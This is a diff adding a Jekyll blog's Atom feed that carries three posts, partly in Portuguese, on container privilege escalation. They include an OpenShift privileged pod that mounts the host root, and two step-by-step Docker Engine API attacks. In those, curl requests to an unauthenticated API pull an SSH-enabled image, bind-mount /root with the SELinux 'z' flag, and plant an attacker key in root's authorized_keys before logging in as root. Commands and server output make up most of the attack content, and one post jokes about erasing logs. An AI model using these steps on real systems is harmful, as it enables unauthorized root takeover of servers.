@@ -1,0 +1,321 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-05-02T06:14:07-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">pyperanger</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">openShift remote privilege escalation</title><link href="http://localhost:4000/jekyll/update/2019/05/05/openshift.html" rel="alternate" type="text/html" title="openShift remote privilege escalation " /><published>2019-05-05T02:00:00-03:00</published><updated>2019-05-05T02:00:00-03:00</updated><id>http://localhost:4000/jekyll/update/2019/05/05/openshift</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2019/05/05/openshift.html">&lt;p&gt;req&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;ler o karaleo do docker privilege escalation pra entender.. um dia posto mais detalhe..&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;da pra executar tanto via oc (binario de admin) remotamente quanto interface web&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;apiVersion&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;v1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;privid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;kind&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Pod&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;metadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;privid&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;spec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;containers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;privid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ubuntu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;volumeMounts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                             &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;mountPath&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/mnt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                             &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;volumeshared&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+       &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;securityContext&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;capabilities&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;privileged&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;runAsUser&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;volumes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;volumeshared&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                     &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;hostPath&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">req ler o karaleo do docker privilege escalation pra entender.. um dia posto mais detalhe..</summary></entry><entry><title type="html">docker privilege escalation [ method #2 ]</title><link href="http://localhost:4000/jekyll/update/2017/12/15/docker-tar.html" rel="alternate" type="text/html" title="docker privilege escalation [ method #2 ]" /><published>2017-12-15T03:00:00-02:00</published><updated>2017-12-15T03:00:00-02:00</updated><id>http://localhost:4000/jekyll/update/2017/12/15/docker-tar</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2017/12/15/docker-tar.html">&lt;p&gt;vou escrever em portugues carioca pq nao qro pagar de fluente em 1ngl3s ..&lt;/p&gt;
+
+&lt;p&gt;req - ler o primeiro post de priv escalation de docker, saber de docker, http, satanismo
+&lt;br /&gt;
+Vamos lembrar que existem MILHOES de maneiras de tu escalar priv em um container, vou mostrar so mais uma.. tecnica “antiga” ja, mas quando eu explorei pela primeira vez(2016) nao existia nenhum conteudo falando disso na net.. 
+&lt;br /&gt;
+O role eh o mesmo de sempre, fuder a API do docker e levantar um container malicioso.(grandes merdas ne?) se quiser brisar em algo mais foda, leia a DOC do dockerAPI, foi la e somente de la q eu aprendi a fazer esta cagada.. 
+&lt;br /&gt;
+No post anterior eu usei uma imagem dentro do dockerhub e precisei baixar na maquina alvo. Mas e quando a maquina n tem acesso a internet? (lembrando qtu pode usar essa tecnica pra rootar localmente uma maquina q esta escutando a porta REST API apenas localmente). Bom, existe uma caralhada de “E SE” e alguns tu so vai responder lendo DOC e codando um 0day do cu.
+&lt;br /&gt;
+Vamos ao que importa
+&lt;br /&gt;
+RESUMO: criar uma nova imagem apartir de uma existente no repo local e injetar ssh keys no volume compartilhado do root. 
+&lt;br /&gt;
+1 - tu precisa de uma imagem pra inicio de qualquer coisa..
+vamo pegar a menor imagem q tenha dentro do repo local da maquina.. 
+escolha qualquer uma ai http://trouxa:4243/images/json . tenta pegar a mais leve se possivel .. 
+&lt;br /&gt;
+2 - criar um Dockerfile&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM &amp;lt;imagem&amp;gt;
+USER root
+ENTRYPOINT echo &quot;PUBLIC-KEY&quot; &amp;gt;&amp;gt; /root/.ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;salva como Dockerfile e manda pra um tarfile&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;tar -cvf Docker.tar Dockerfile
+&lt;br /&gt;
+3 - agora tu manda pro server
+```bash
+$ curl -XPOST -H “content-type: application/x-tar” –data-binary @Docker.tar “http://trouxa/build”&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;{“stream”: “Step 1: FROM some-minimal-image \ n”}
+{“stream”: “— \ u003e 214bf35152ea \ n”}
+{“stream”: “Step 2: user root \ n”}
+{“stream”: “— \ u003e Running at 78af75a2b4d7 \ n”}
+{“stream”: “— \ u003e 74d106dea791 \ n”}
+{“stream”: “Removing the intermediate container 78af75a2b4d7 \ n”}
+{“stream”: “Step 3: ENTRYPOINT echo &quot; ssh-rsa MY_PUBLIC_KEY \ “\ u003e /root/.ssh/authorized_keys\n”}
+{“stream”: “— \ u003e Running on bebcc4a6ba0f \ n”}
+{“stream”: “— \ u003e 0470cc164544 \ n”}
+{“stream”: “Removing the intermediate container bebcc4a6ba0f \ n”}
+{“stream”: “0470cc164544 successfully built \ n”}&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;br&amp;gt;
+4 - configurar o container 
+agora eh ajustar pra rolar o shared volume do /root/:/root/. nao esquecendo da flag 'z' que &quot;bypassa&quot; o SELINUX e outras limitacoes do Docker 
+```bash
+curl -H &quot;Content-Type: application/json&quot; -d '{&quot;Image&quot;:&quot;0470cc164544&quot;, &quot;Binds&quot;: [&quot;/root/:/root/:rw,z&quot;]}' -XPOST &quot;http://trouxa/containers/create&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+criou? papum agora
+&lt;br /&gt;
+5 - granfinale 
+agora eh so tu inciar o container e foi a merda feita..&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;s2&quot;&gt;&quot;http://trouxa/containers/&amp;lt;container-id&amp;gt;/start&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
+...
+ssh root@trouxa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+pronto.. ta feliz? nao esquece de apagar seus lo.. pera
+&lt;br /&gt;
+ISSO EH PRA ESTUDO E DIVER..
+&lt;br /&gt;
+  nao me respondabilizo pelo uso recreativo desse conteudo&lt;/p&gt;</content><author><name></name></author><summary type="html">vou escrever em portugues carioca pq nao qro pagar de fluente em 1ngl3s ..</summary></entry><entry><title type="html">docker privilege escalation [ OLD METHOD ]</title><link href="http://localhost:4000/jekyll/update/2017/05/10/docker-api.html" rel="alternate" type="text/html" title="docker privilege escalation [ OLD METHOD ]" /><published>2017-05-10T02:00:00-03:00</published><updated>2017-05-10T02:00:00-03:00</updated><id>http://localhost:4000/jekyll/update/2017/05/10/docker-api</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2017/05/10/docker-api.html">&lt;p&gt;world wide exploitable size 2015&lt;/p&gt;
+
+&lt;h1 id=&quot;docker-api-privilege-escalation&quot;&gt;Docker API Privilege Escalation&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;This document has the objective to explain a simple way to remotely make a privilege escalation in a Docker, using it’s own Engine API service.&lt;/p&gt;
+
+&lt;p&gt;During my analisys routine I manage to successfully make an attack, so I decided to share freely.&lt;/p&gt;
+
+&lt;p&gt;I`ve made an image available containing a SSH service enabled in the  &lt;a href=&quot;https://hub.docker.com/r/pype/privsshd/&quot;&gt;Docker Hub&lt;/a&gt; to help in the attack (The image available it’s huge, more than 200MB because of the Ubuntu base image. As soon as possible I will made available a smaller image).&lt;/p&gt;
+
+&lt;p&gt;PS: This attack explore a option available in the docker, without the need to utilize memory exploitation or similar way (As usually used to escape the container).
+&lt;strong&gt;PS2: This is only ONE of many ways to explore an server utilizing the docker API service.&lt;/strong&gt; If during my analysis I find others explore methods, I will post in this repository.&lt;/p&gt;
+
+&lt;p&gt;Any suggestions to improve the attack or to protect yourself, I’m available to listen to all of it and add to this document if appropriate.&lt;/p&gt;
+
+&lt;h2 id=&quot;engine-api&quot;&gt;Engine API&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;“The Engine API is an HTTP API served by Docker Engine. It is the API the Docker client uses to communicate with the Engine, so everything the Docker client can do can be done with the API.”&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;By default this service don’t use any authentication&lt;/strong&gt;, but this resource it’s made available by the platform.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.docker.com/engine/api/v1.32/&quot;&gt;Docker Engine API&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.docker.com/engine/api/v1.32/#section/Authentication&quot;&gt;Authentication&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;During the attack, we are going to utilize the parameters provided by the platform so this way we can explore the system and obtain privileged internal access.&lt;/p&gt;
+
+&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;The main focus of the attack it’s to be able to inject our public key inside the file &lt;em&gt;“authorized_keys”&lt;/em&gt; from the root user in the server!&lt;/p&gt;
+
+&lt;p&gt;The exploration consist in six parts:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Push the image in server&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Configure a container with our image&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Start the container&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Connect to container SSH&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Import public key in .ssh/authorized_keys in root directory&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Finaly connect to SSH server with root access&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Push image in server&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The selected image for the attack need to have some kind the shell remote service available in the start, so this way we can connect to the container inside the server.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-XPOST&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://victim/images/create?fromImage=pype/privsshd&quot;&lt;/span&gt;
+
+&amp;lt; HTTP/1.1 200 OK
+&amp;lt; Content-Type: application/json
+&amp;lt; Server: Docker/1.12.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&amp;lt; Date: Sat, 06 Jan 2018 15:41:46 GMT
+&amp;lt; Transfer-Encoding: chunked
+&amp;lt; 
+...
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Status: Image is up to date for docker.io/pype/privsshd:latest&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In the example above I used the option to create an image from the official repository. There is &lt;a href=&quot;https://docs.docker.com/engine/api/v1.24/#32-images&quot;&gt;other methods&lt;/a&gt; to execute the same operation.&lt;/p&gt;
+
+&lt;p&gt;pype/privsshd -  The Image that I’ve made available to help in the documentation of the attack.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Configure a container with our image&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For we to be able to inject our public key inside the file .ssh/authorized_key, we need access to the root directory in the Docker Server. For this we are going to utilize the option “Binds”, this way we can select the volume of what is going to be shared between the server and our container. (Remember to configure the read and write option)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;SELINUX  &lt;em&gt;“Bypass”&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The Docker provides a mounting option capable of modify the SELINUX file or directory label shared with the container. With this option, it’s possible to mount privileged directory inside of our container (E.g.: /root/;/etc;/bin …).&lt;/p&gt;
+
+&lt;p&gt;We can send this option via API too, this way we can work around the SELINUX remotely .&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;“This affects the file or directory on the host machine itself and can have consequences outside of the scope of Docker.”&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Binds&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/root/:/root/:rw,z&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mais informações: &lt;a href=&quot;https://docs.docker.com/engine/admin/volumes/bind-mounts/#configure-the-selinux-label&quot;&gt;Configure-the-selinux-label&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Supposing that our target server already has the port number 22 busy by it’s own SSH service, we have to point another outgoing port for our connection with the container, we are going to configure the option “PortBindings” with “HostPort” in another port.&lt;/p&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  
+   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pype/privsshd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Binds&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  
+      &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/root/:/root/:rw,z&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;PortBindings&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  
+      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;22/tcp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  
+         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;HostIp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;HostPort&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2233&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;JSON it’s the only format accepted by the platform, therefore configure the Content-Type of your requisition to this type of language.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: application/json&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;Image&quot;:&quot;pype/privsshd&quot;, &quot;Binds&quot;: [&quot;/root/:/root/:rw,z&quot;],&quot;PortBindings&quot;:{&quot;22/tcp&quot;:[{&quot;HostIp&quot;:&quot;&quot;,&quot;HostPort&quot;:&quot;2233&quot;}]}}'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-XPOST&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://victim/containers/create&quot;&lt;/span&gt;
+
+&amp;lt; HTTP/1.1 201 Created
+&amp;lt; Content-Type: application/json
+&amp;lt; Server: Docker/1.12.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&amp;lt; Date: Sat, 06 Jan 2018 16:03:34 GMT
+&amp;lt; Content-Length: 90
+&amp;lt; 
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Id&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;5a3c7f18d202f62...4789e781132495781f&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Warnings&quot;&lt;/span&gt;:null&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;If everything worked out, the requisition will return an ID and this will be the your container identifier&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Start the container&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Use the Identifier to start your container remotely.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-XPOST&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://victim/containers/5a3c7f18d202f62...4789e781132495781f/start&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 
+
+&amp;lt; HTTP/1.1 204 No Content
+&amp;lt; Server: Docker/1.12.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&amp;lt; Date: Sat, 06 Jan 2018 22:29:46 GMT
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
